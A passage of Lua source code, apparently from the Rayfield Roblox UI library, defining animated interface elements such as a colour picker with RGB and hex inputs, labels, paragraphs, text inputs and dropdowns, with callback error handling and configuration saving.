						print("Rayfield | "..ButtonSettings.Name.." Callback Error " ..tostring(Response))
						wait(0.5)
						Button.Title.Text = ButtonSettings.Name
						TweenService:Create(Button, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
						TweenService:Create(Button.ElementIndicator, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.9}):Play()
						TweenService:Create(Button.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
					else
						SaveConfiguration()
						TweenService:Create(Button, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
						TweenService:Create(Button.ElementIndicator, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
						TweenService:Create(Button.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						wait(0.2)
						TweenService:Create(Button, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
						TweenService:Create(Button.ElementIndicator, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.9}):Play()
						TweenService:Create(Button.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
					end
				end)

				Button.MouseEnter:Connect(function()
					TweenService:Create(Button, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
					TweenService:Create(Button.ElementIndicator, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.7}):Play()
				end)

				Button.MouseLeave:Connect(function()
					TweenService:Create(Button, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
					TweenService:Create(Button.ElementIndicator, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.9}):Play()
				end)

				function ButtonValue:Set(NewButton)
					Button.Title.Text = NewButton
					Button.Name = NewButton
				end

				return ButtonValue
			end

			-- ColorPicker
			function Tab:CreateColorPicker(ColorPickerSettings) -- by Throit
				ColorPickerSettings.Type = "ColorPicker"
				local ColorPicker = Elements.Template.ColorPicker:Clone()
				local Background = ColorPicker.CPBackground
				local Display = Background.Display
				local Main = Background.MainCP
				local Slider = ColorPicker.ColorSlider
				ColorPicker.ClipsDescendants = true
				ColorPicker.Name = ColorPickerSettings.Name
				ColorPicker.Title.Text = ColorPickerSettings.Name
				ColorPicker.Visible = true
				ColorPicker.Parent = TabPage
				ColorPicker.Size = UDim2.new(1, -10, 0.028, 35)
				Background.Size = UDim2.new(0, 39, 0, 22)
				Display.BackgroundTransparency = 0
				Main.MainPoint.ImageTransparency = 1
				ColorPicker.Interact.Size = UDim2.new(1, 0, 1, 0)
				ColorPicker.Interact.Position = UDim2.new(0.5, 0, 0.5, 0)
				ColorPicker.RGB.Position = UDim2.new(0, 17, 0, 70)
				ColorPicker.HexInput.Position = UDim2.new(0, 17, 0, 90)
				Main.ImageTransparency = 1
				Background.BackgroundTransparency = 1



				local opened = false 
				local mouse = game.Players.LocalPlayer:GetMouse()
				Main.Image = "http://www.roblox.com/asset/?id=11415645739"
				local mainDragging = false 
				local sliderDragging = false 
				ColorPicker.Interact.MouseButton1Down:Connect(function()
					if not opened then
						opened = true 
						TweenService:Create(ColorPicker, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(1, -10, 0.224, 40)}):Play()
						TweenService:Create(Background, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 173, 0, 86)}):Play()
						TweenService:Create(Display, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
						TweenService:Create(ColorPicker.Interact, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Position = UDim2.new(0.289, 0, 0.5, 0)}):Play()
						TweenService:Create(ColorPicker.RGB, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {Position = UDim2.new(0, 17, 0, 40)}):Play()
						TweenService:Create(ColorPicker.HexInput, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Position = UDim2.new(0, 17, 0, 73)}):Play()
						TweenService:Create(ColorPicker.Interact, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(0.574, 0, 1, 0)}):Play()
						TweenService:Create(Main.MainPoint, TweenInfo.new(0.2, Enum.EasingStyle.Quint), {ImageTransparency = 0}):Play()
						TweenService:Create(Main, TweenInfo.new(0.2, Enum.EasingStyle.Quint), {ImageTransparency = 0.1}):Play()
						TweenService:Create(Background, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
					else
						opened = false
						TweenService:Create(ColorPicker, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(1, -10, 0.028, 35)}):Play()
						TweenService:Create(Background, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 39, 0, 22)}):Play()
						TweenService:Create(ColorPicker.Interact, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(1, 0, 1, 0)}):Play()
						TweenService:Create(ColorPicker.Interact, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
						TweenService:Create(ColorPicker.RGB, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Position = UDim2.new(0, 17, 0, 70)}):Play()
						TweenService:Create(ColorPicker.HexInput, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Position = UDim2.new(0, 17, 0, 90)}):Play()
						TweenService:Create(Display, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
						TweenService:Create(Main.MainPoint, TweenInfo.new(0.2, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
						TweenService:Create(Main, TweenInfo.new(0.2, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
						TweenService:Create(Background, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
					end
				end)

				game:GetService("UserInputService").InputEnded:Connect(function(input, gameProcessed) if input.UserInputType == Enum.UserInputType.MouseButton1 then 
						mainDragging = false
						sliderDragging = false
					end end)
				Main.MouseButton1Down:Connect(function()
					if opened then
						mainDragging = true 
					end
				end)
				Main.MainPoint.MouseButton1Down:Connect(function()
					if opened then
						mainDragging = true 
					end
				end)
				Slider.MouseButton1Down:Connect(function()
					sliderDragging = true 
				end)
				Slider.SliderPoint.MouseButton1Down:Connect(function()
					sliderDragging = true 
				end)
				local h,s,v = ColorPickerSettings.Color:ToHSV()
				local color = Color3.fromHSV(h,s,v) 
				local hex = string.format("#%02X%02X%02X",color.R*0xFF,color.G*0xFF,color.B*0xFF)
				ColorPicker.HexInput.InputBox.Text = hex
				local function setDisplay()
					--Main
					Main.MainPoint.Position = UDim2.new(s,-Main.MainPoint.AbsoluteSize.X/2,1-v,-Main.MainPoint.AbsoluteSize.Y/2)
					Main.MainPoint.ImageColor3 = Color3.fromHSV(h,s,v)
					Background.BackgroundColor3 = Color3.fromHSV(h,1,1)
					Display.BackgroundColor3 = Color3.fromHSV(h,s,v)
					--Slider 
					local x = h * Slider.AbsoluteSize.X
					Slider.SliderPoint.Position = UDim2.new(0,x-Slider.SliderPoint.AbsoluteSize.X/2,0.5,0)
					Slider.SliderPoint.ImageColor3 = Color3.fromHSV(h,1,1)
					local color = Color3.fromHSV(h,s,v) 
					local r,g,b = math.floor((color.R*255)+0.5),math.floor((color.G*255)+0.5),math.floor((color.B*255)+0.5)
					ColorPicker.RGB.RInput.InputBox.Text = tostring(r)
					ColorPicker.RGB.GInput.InputBox.Text = tostring(g)
					ColorPicker.RGB.BInput.InputBox.Text = tostring(b)
					hex = string.format("#%02X%02X%02X",color.R*0xFF,color.G*0xFF,color.B*0xFF)
					ColorPicker.HexInput.InputBox.Text = hex
				end
				setDisplay()
				ColorPicker.HexInput.InputBox.FocusLost:Connect(function()
					if not pcall(function()
							local r, g, b = string.match(ColorPicker.HexInput.InputBox.Text, "^#?(%w%w)(%w%w)(%w%w)$")
							local rgbColor = Color3.fromRGB(tonumber(r, 16),tonumber(g, 16), tonumber(b, 16))
							h,s,v = rgbColor:ToHSV()
							hex = ColorPicker.HexInput.InputBox.Text
							setDisplay()
							ColorPickerSettings.Color = rgbColor
						end) 
					then 
						ColorPicker.HexInput.InputBox.Text = hex 
					end
					pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
					local r,g,b = math.floor((h*255)+0.5),math.floor((s*255)+0.5),math.floor((v*255)+0.5)
					ColorPickerSettings.Color = Color3.fromRGB(r,g,b)
					SaveConfiguration()
				end)
				--RGB
				local function rgbBoxes(box,toChange)
					local value = tonumber(box.Text) 
					local color = Color3.fromHSV(h,s,v) 
					local oldR,oldG,oldB = math.floor((color.R*255)+0.5),math.floor((color.G*255)+0.5),math.floor((color.B*255)+0.5)
					local save 
					if toChange == "R" then save = oldR;oldR = value elseif toChange == "G" then save = oldG;oldG = value else save = oldB;oldB = value end
					if value then 
						value = math.clamp(value,0,255)
						h,s,v = Color3.fromRGB(oldR,oldG,oldB):ToHSV()

						setDisplay()
					else 
						box.Text = tostring(save)
					end
					local r,g,b = math.floor((h*255)+0.5),math.floor((s*255)+0.5),math.floor((v*255)+0.5)
					ColorPickerSettings.Color = Color3.fromRGB(r,g,b)
					SaveConfiguration()
				end
				ColorPicker.RGB.RInput.InputBox.FocusLost:connect(function()
					rgbBoxes(ColorPicker.RGB.RInput.InputBox,"R")
					pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
				end)
				ColorPicker.RGB.GInput.InputBox.FocusLost:connect(function()
					rgbBoxes(ColorPicker.RGB.GInput.InputBox,"G")
					pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
				end)
				ColorPicker.RGB.BInput.InputBox.FocusLost:connect(function()
					rgbBoxes(ColorPicker.RGB.BInput.InputBox,"B")
					pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
				end)

				game:GetService("RunService").RenderStepped:connect(function()
					if mainDragging then 
						local localX = math.clamp(mouse.X-Main.AbsolutePosition.X,0,Main.AbsoluteSize.X)
						local localY = math.clamp(mouse.Y-Main.AbsolutePosition.Y,0,Main.AbsoluteSize.Y)
						Main.MainPoint.Position = UDim2.new(0,localX-Main.MainPoint.AbsoluteSize.X/2,0,localY-Main.MainPoint.AbsoluteSize.Y/2)
						s = localX / Main.AbsoluteSize.X
						v = 1 - (localY / Main.AbsoluteSize.Y)
						Display.BackgroundColor3 = Color3.fromHSV(h,s,v)
						Main.MainPoint.ImageColor3 = Color3.fromHSV(h,s,v)
						Background.BackgroundColor3 = Color3.fromHSV(h,1,1)
						local color = Color3.fromHSV(h,s,v) 
						local r,g,b = math.floor((color.R*255)+0.5),math.floor((color.G*255)+0.5),math.floor((color.B*255)+0.5)
						ColorPicker.RGB.RInput.InputBox.Text = tostring(r)
						ColorPicker.RGB.GInput.InputBox.Text = tostring(g)
						ColorPicker.RGB.BInput.InputBox.Text = tostring(b)
						ColorPicker.HexInput.InputBox.Text = string.format("#%02X%02X%02X",color.R*0xFF,color.G*0xFF,color.B*0xFF)
						pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
						ColorPickerSettings.Color = Color3.fromRGB(r,g,b)
						SaveConfiguration()
					end
					if sliderDragging then 
						local localX = math.clamp(mouse.X-Slider.AbsolutePosition.X,0,Slider.AbsoluteSize.X)
						h = localX / Slider.AbsoluteSize.X
						Display.BackgroundColor3 = Color3.fromHSV(h,s,v)
						Slider.SliderPoint.Position = UDim2.new(0,localX-Slider.SliderPoint.AbsoluteSize.X/2,0.5,0)
						Slider.SliderPoint.ImageColor3 = Color3.fromHSV(h,1,1)
						Background.BackgroundColor3 = Color3.fromHSV(h,1,1)
						Main.MainPoint.ImageColor3 = Color3.fromHSV(h,s,v)
						local color = Color3.fromHSV(h,s,v) 
						local r,g,b = math.floor((color.R*255)+0.5),math.floor((color.G*255)+0.5),math.floor((color.B*255)+0.5)
						ColorPicker.RGB.RInput.InputBox.Text = tostring(r)
						ColorPicker.RGB.GInput.InputBox.Text = tostring(g)
						ColorPicker.RGB.BInput.InputBox.Text = tostring(b)
						ColorPicker.HexInput.InputBox.Text = string.format("#%02X%02X%02X",color.R*0xFF,color.G*0xFF,color.B*0xFF)
						pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
						ColorPickerSettings.Color = Color3.fromRGB(r,g,b)
						SaveConfiguration()
					end
				end)

				if Settings.ConfigurationSaving then
					if Settings.ConfigurationSaving.Enabled and ColorPickerSettings.Flag then
						RayfieldLibrary.Flags[ColorPickerSettings.Flag] = ColorPickerSettings
					end
				end

				function ColorPickerSettings:Set(RGBColor)
					ColorPickerSettings.Color = RGBColor
					h,s,v = ColorPickerSettings.Color:ToHSV()
					color = Color3.fromHSV(h,s,v)
					setDisplay()
				end

				return ColorPickerSettings
			end

			-- Section
			function Tab:CreateSection(SectionName)

				local SectionValue = {}

				if SDone then
					local SectionSpace = Elements.Template.SectionSpacing:Clone()
					SectionSpace.Visible = true
					SectionSpace.Parent = TabPage
				end

				local Section = Elements.Template.SectionTitle:Clone()
				Section.Title.Text = SectionName
				Section.Visible = true
				Section.Parent = TabPage

				Section.Title.TextTransparency = 1
				TweenService:Create(Section.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()

				function SectionValue:Set(NewSection)
					Section.Title.Text = NewSection
				end

				SDone = true

				return SectionValue
			end

			-- Label
			function Tab:CreateLabel(LabelText)
				local LabelValue = {}

				local Label = Elements.Template.Label:Clone()
				Label.Title.Text = LabelText
				Label.Visible = true
				Label.Parent = TabPage

				Label.BackgroundTransparency = 1
				Label.UIStroke.Transparency = 1
				Label.Title.TextTransparency = 1

				Label.BackgroundColor3 = SelectedTheme.SecondaryElementBackground
				Label.UIStroke.Color = SelectedTheme.SecondaryElementStroke

				TweenService:Create(Label, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(Label.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
				TweenService:Create(Label.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()	

				function LabelValue:Set(NewLabel)
					Label.Title.Text = NewLabel
				end

				return LabelValue
			end

			-- Paragraph
			function Tab:CreateParagraph(ParagraphSettings)
				local ParagraphValue = {}

				local Paragraph = Elements.Template.Paragraph:Clone()
				Paragraph.Title.Text = ParagraphSettings.Title
				Paragraph.Content.Text = ParagraphSettings.Content
				Paragraph.Visible = true
				Paragraph.Parent = TabPage

				Paragraph.Content.Size = UDim2.new(0, 438, 0, Paragraph.Content.TextBounds.Y)
				Paragraph.Content.Position = UDim2.new(1, -10, 0.575,0 )
				Paragraph.Size = UDim2.new(1, -10, 0, Paragraph.Content.TextBounds.Y + 40)

				Paragraph.BackgroundTransparency = 1
				Paragraph.UIStroke.Transparency = 1
				Paragraph.Title.TextTransparency = 1
				Paragraph.Content.TextTransparency = 1

				Paragraph.BackgroundColor3 = SelectedTheme.SecondaryElementBackground
				Paragraph.UIStroke.Color = SelectedTheme.SecondaryElementStroke

				TweenService:Create(Paragraph, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(Paragraph.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
				TweenService:Create(Paragraph.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()	
				TweenService:Create(Paragraph.Content, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()	

				function ParagraphValue:Set(NewParagraphSettings)
					Paragraph.Title.Text = NewParagraphSettings.Title
					Paragraph.Content.Text = NewParagraphSettings.Content
				end

				return ParagraphValue
			end

			-- Input
			function Tab:CreateInput(InputSettings)
				local Input = Elements.Template.Input:Clone()
				Input.Name = InputSettings.Name
				Input.Title.Text = InputSettings.Name
				Input.Visible = true
				Input.Parent = TabPage

				Input.BackgroundTransparency = 1
				Input.UIStroke.Transparency = 1
				Input.Title.TextTransparency = 1

				Input.InputFrame.BackgroundColor3 = SelectedTheme.InputBackground
				Input.InputFrame.UIStroke.Color = SelectedTheme.InputStroke

				TweenService:Create(Input, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(Input.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
				TweenService:Create(Input.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()	

				Input.InputFrame.InputBox.PlaceholderText = InputSettings.PlaceholderText
				Input.InputFrame.Size = UDim2.new(0, Input.InputFrame.InputBox.TextBounds.X + 24, 0, 30)

				Input.InputFrame.InputBox.FocusLost:Connect(function()


					local Success, Response = pcall(function()
						InputSettings.Callback(Input.InputFrame.InputBox.Text)
					end)
					if not Success then
						TweenService:Create(Input, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(85, 0, 0)}):Play()
						TweenService:Create(Input.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
						Input.Title.Text = "Callback Error"
						print("Rayfield | "..InputSettings.Name.." Callback Error " ..tostring(Response))
						wait(0.5)
						Input.Title.Text = InputSettings.Name
						TweenService:Create(Input, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
						TweenService:Create(Input.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
					end

					if InputSettings.RemoveTextAfterFocusLost then
						Input.InputFrame.InputBox.Text = ""
					end
					SaveConfiguration()
				end)

				Input.MouseEnter:Connect(function()
					TweenService:Create(Input, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
				end)

				Input.MouseLeave:Connect(function()
					TweenService:Create(Input, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
				end)

				Input.InputFrame.InputBox:GetPropertyChangedSignal("Text"):Connect(function()
					TweenService:Create(Input.InputFrame, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, Input.InputFrame.InputBox.TextBounds.X + 24, 0, 30)}):Play()
				end)

				local InputSettings = {}
				function InputSettings:Set(text) --Doesnt fire the event
					Input.InputFrame.InputBox.Text = text
				end
				return InputSettings
			end

			-- Dropdown
			function Tab:CreateDropdown(DropdownSettings)
				local Dropdown = Elements.Template.Dropdown:Clone()
				if string.find(DropdownSettings.Name,"closed") then
					Dropdown.Name = "Dropdown"
				else
					Dropdown.Name = DropdownSettings.Name
				end
				Dropdown.Title.Text = DropdownSettings.Name
				Dropdown.Visible = true
				Dropdown.Parent = TabPage

				Dropdown.List.Visible = false

				if typeof(DropdownSettings.CurrentOption) == "string" then
					DropdownSettings.CurrentOption = {DropdownSettings.CurrentOption}
				end

				if not DropdownSettings.MultipleOptions then
					DropdownSettings.CurrentOption = {DropdownSettings.CurrentOption[1]}
				end

				if DropdownSettings.MultipleOptions then
					if #DropdownSettings.CurrentOption == 1 then
						Dropdown.Selected.Text = DropdownSettings.CurrentOption[1]
					elseif #DropdownSettings.CurrentOption == 0 then
						Dropdown.Selected.Text = "None"
					else
						Dropdown.Selected.Text = "Various"
					end
				else
					Dropdown.Selected.Text = DropdownSettings.CurrentOption[1]
				end


				Dropdown.BackgroundTransparency = 1
				Dropdown.UIStroke.Transparency = 1
				Dropdown.Title.TextTransparency = 1

				Dropdown.Size = UDim2.new(1, -10, 0, 45)

				TweenService:Create(Dropdown, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				TweenService:Create(Dropdown.UIStroke, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
				TweenService:Create(Dropdown.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()	

				for _, ununusedoption in ipairs(Dropdown.List:GetChildren()) do
					if ununusedoption.ClassName == "Frame" and ununusedoption.Name ~= "Placeholder" then
						ununusedoption:Destroy()
					end
				end

				Dropdown.Toggle.Rotation = 180

				Dropdown.Interact.MouseButton1Click:Connect(function()
					TweenService:Create(Dropdown, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
					TweenService:Create(Dropdown.UIStroke, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
					wait(0.1)
					TweenService:Create(Dropdown, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
					TweenService:Create(Dropdown.UIStroke, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
					if Debounce then return end
					if Dropdown.List.Visible then
						Debounce = true
						TweenService:Create(Dropdown, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(1, -10, 0, 45)}):Play()
						for _, DropdownOpt in ipairs(Dropdown.List:GetChildren()) do
							if DropdownOpt.ClassName == "Frame" and DropdownOpt.Name ~= "Placeholder" then
								TweenService:Create(DropdownOpt, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
								TweenService:Create(DropdownOpt.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
								TweenService:Create(DropdownOpt.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
							end
						end
						TweenService:Create(Dropdown.List, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ScrollBarImageTransparency = 1}):Play()
						TweenService:Create(Dropdown.Toggle, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Rotation = 180}):Play()	
						wait(0.35)
						Dropdown.List.Visible = false
						Debounce = false
					else
						TweenService:Create(Dropdown, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(1, -10, 0, 180)}):Play()
						Dropdown.List.Visible = true
						TweenService:Create(Dropdown.List, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ScrollBarImageTransparency = 0.7}):Play()
						TweenService:Create(Dropdown.Toggle, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Rotation = 0}):Play()	
						for _, DropdownOpt in ipairs(Dropdown.List:GetChildren()) do
							if DropdownOpt.ClassName == "Frame" and DropdownOpt.Name ~= "Placeholder" then
								TweenService:Create(DropdownOpt, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
								TweenService:Create(DropdownOpt.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
								TweenService:Create(DropdownOpt.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
							end
						end
					end
				end)

				Dropdown.MouseEnter:Connect(function()
					if not Dropdown.List.Visible then
						TweenService:Create(Dropdown, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackgroundHover}):Play()
					end
				end)

				Dropdown.MouseLeave:Connect(function()
					TweenService:Create(Dropdown, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
				end)

				for _, Option in ipairs(DropdownSettings.Options) do
					local DropdownOption = Elements.Template.Dropdown.List.Template:Clone()
					DropdownOption.Name = Option
					DropdownOption.Title.Text = Option
					DropdownOption.Parent = Dropdown.List
					DropdownOption.Visible = true

					if DropdownSettings.CurrentOption == Option then
						DropdownOption.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
					end

					DropdownOption.BackgroundTransparency = 1
					DropdownOption.UIStroke.Transparency = 1
					DropdownOption.Title.TextTransparency = 1

					--local Dropdown = Tab:CreateDropdown({
					--	Name = "Dropdown Example",
					--	Options = {"Option 1","Option 2"},
					--	CurrentOption = {"Option 1"},
					--  MultipleOptions = true,
					--	Flag = "Dropdown1",
					--	Callback = function(TableOfOptions)

					--	end,
					--})


					DropdownOption.Interact.ZIndex = 50
					DropdownOption.Interact.MouseButton1Click:Connect(function()
						if not DropdownSettings.MultipleOptions and table.find(DropdownSettings.CurrentOption, Option) then 
							return
						end

						if table.find(DropdownSettings.CurrentOption, Option) then
							table.remove(DropdownSettings.CurrentOption, table.find(DropdownSettings.CurrentOption, Option))
							if DropdownSettings.MultipleOptions then
								if #DropdownSettings.CurrentOption == 1 then
									Dropdown.Selected.Text = DropdownSettings.CurrentOption[1]
								elseif #DropdownSettings.CurrentOption == 0 then
									Dropdown.Selected.Text = "None"
								else
									Dropdown.Selected.Text = "Various"
								end
							else
								Dropdown.Selected.Text = DropdownSettings.CurrentOption[1]
							end
						else
							if not DropdownSettings.MultipleOptions then
								table.clear(DropdownSettings.CurrentOption)
							end
							table.insert(DropdownSettings.CurrentOption, Option)
							if DropdownSettings.MultipleOptions then
								if #DropdownSettings.CurrentOption == 1 then
									Dropdown.Selected.Text = DropdownSettings.CurrentOption[1]
								elseif #DropdownSettings.CurrentOption == 0 then
									Dropdown.Selected.Text = "None"
								else
									Dropdown.Selected.Text = "Various"
								end
							else
								Dropdown.Selected.Text = DropdownSettings.CurrentOption[1]
							end
							TweenService:Create(DropdownOption.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
							TweenService:Create(DropdownOption, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
							Debounce = true
							wait(0.2)
							TweenService:Create(DropdownOption.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
						end


						local Success, Response = pcall(function()
							DropdownSettings.Callback(DropdownSettings.CurrentOption)
						end)

						if not Success then
							TweenService:Create(Dropdown, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(85, 0, 0)}):Play()
							TweenService:Create(Dropdown.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
							Dropdown.Title.Text = "Callback Error"
							print("Rayfield | "..DropdownSettings.Name.." Callback Error " ..tostring(Response))
							wait(0.5)
							Dropdown.Title.Text = DropdownSettings.Name
							TweenService:Create(Dropdown, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {BackgroundColor3 = SelectedTheme.ElementBackground}):Play()
							TweenService:Create(Dropdown.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
						end

						for _, droption in ipairs(Dropdown.List:GetChildren()) do
							if droption.ClassName == "Frame" and droption.Name ~= "Placeholder" and not table.find(DropdownSettings.CurrentOption, droption.Name) then
								TweenService:Create(droption, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
							end
						end
						if not DropdownSettings.MultipleOptions then
							wait(0.1)
							TweenService:Create(Dropdown, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(1, -10, 0, 45)}):Play()
							for _, DropdownOpt in ipairs(Dropdown.List:GetChildren()) do
								if DropdownOpt.ClassName == "Frame" and DropdownOpt.Name ~= "Placeholder" then
									TweenService:Create(DropdownOpt, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
									TweenService:Create(DropdownOpt.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
									TweenService:Create(DropdownOpt.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
								end
							end
							TweenService:Create(Dropdown.List, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ScrollBarImageTransparency = 1}):Play()
							TweenService:Create(Dropdown.Toggle, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Rotation = 180}):Play()	
							wait(0.35)
							Dropdown.List.Visible = false
						end
						Debounce = false	
						SaveConfiguration()
					end)
				end

				for _, droption in ipairs(Dropdown.List:GetChildren()) do
					if droption.ClassName == "Frame" and droption.Name ~= "Placeholder" then
						if not table.find(DropdownSettings.CurrentOption, droption.Name) then
							droption.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
						else
							droption.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
						end
					end
				end

				function DropdownSettings:Set(NewOption)
					DropdownSettings.CurrentOption = NewOption

					if typeof(DropdownSettings.CurrentOption) == "string" then
						DropdownSettings.CurrentOption = {DropdownSettings.CurrentOption}
					end

					if not DropdownSettings.MultipleOptions then
						DropdownSettings.CurrentOption = {DropdownSettings.CurrentOption[1]}
					end

					if DropdownSettings.MultipleOptions then
						if #DropdownSettings.CurrentOption == 1 then
							Dropdown.Selected.Text = DropdownSettings.CurrentOption[1]
						elseif #DropdownSettings.CurrentOption == 0 then
							Dropdown.Selected.Text = "None"
						else
							Dropdown.Selected.Text = "Various"
						end
					else
						Dropdown.Selected.Text = DropdownSettings.CurrentOption[1]
					end


					local Success, Response = pcall(function()
						DropdownSettings.Callback(NewOption)
					end)
					if not Success then
